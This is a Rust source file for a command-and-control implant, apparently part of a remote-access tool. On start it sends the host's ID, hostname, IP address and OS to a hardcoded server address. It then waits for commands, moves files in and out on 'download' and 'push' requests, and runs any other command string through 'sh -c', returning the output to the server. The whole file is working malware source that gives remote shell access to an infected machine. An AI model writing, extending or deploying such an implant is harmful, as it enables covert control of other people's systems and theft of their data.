mod fileoperations;
mod implant_details;

use std::error::Error;
use std::process::Command;
use std::str::from_utf8;
use std::process::exit;
use serde_json::json;
use chrono::prelude::*;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::runtime::Runtime;

const SERVER_ADDR: (&str, u16) = ("127.0.0.1", 5000);
const BUFFER_SIZE: usize = 4096;

async fn run() -> Result<(), Box<dyn Error>> {
    let implant_id = implant_details::generate_implant_id();
    let hostname = implant_details::get_hostname().unwrap_or_else(|_| "unknown".to_string());
    let ip_address = implant_details::get_ip_address()?;
    let os = implant_details::get_os()?;

    let mut stream = TcpStream::connect(SERVER_ADDR).await?;

    println!("[+] Connected to the server at {:?}", SERVER_ADDR);

    let implant_info = json!({
        "implant_id": implant_id,
        "hostname": hostname,
        "ip_address": ip_address,
        "os": os,
        "first_seen": Utc::now().to_rfc3339(),
        "last_seen": Utc::now().to_rfc3339(),
    });

    let implant_info_str = implant_info.to_string() + "\0";

    stream.write_all(implant_info_str.as_bytes()).await?;

    loop {
        let mut buf = [0u8; BUFFER_SIZE];
        let n = stream.read(&mut buf).await?;

        if n == 0 {
            // Connection was closed by the server
            return Ok(());
        }

        let command = std::str::from_utf8(&buf[..n])?.trim_end_matches(char::from(0)).to_string();

        if command.is_empty() {
            continue;
        }

        println!("Received command: {}", command);

        if command.starts_with("download ") {
            let output = fileoperations::run_download(&command)?;
            stream.write_all(output.as_bytes()).await?;
        } else if command.starts_with("push ") {
            let mut file_data = Vec::new();
            loop {
                let mut buffer = vec![0u8; BUFFER_SIZE];
                let size = stream.read(&mut buffer).await?;
                if size == 0 {
                    break;
                }
                if buffer[size - 1] == 0 {
                    file_data.extend_from_slice(&buffer[..size - 1]);
                    break;
                } else {
                    file_data.extend_from_slice(&buffer[..size]);
                }
            }
            fileoperations::run_push(&command, &file_data)?;
        } else {
            match command.as_str() {
                "exit" => {
                    break;
                }
                _ => {
                    let output = Command::new("sh")
                        .arg("-c")
                        .arg(&command)
                        .output()
                        .expect("Failed to execute command");

                    stream.write_all(&output.stdout).await?;
                    stream.write_all(&output.stderr).await?;
                    stream.write_all(b"\0").await?; // Send the null byte to indicate the end of the output

                    // Wait for the acknowledgment from the C2 server
                    let mut ack_buf = [0u8; 1];
                    stream.read_exact(&mut ack_buf).await?;
                }
            }
        }
    }

    Ok(())
}


fn main() {
    let rt = Runtime::new().unwrap();
    if let Err(e) = rt.block_on(run()) {
        println!("Error: {}", e);
        exit(1);
    }
}
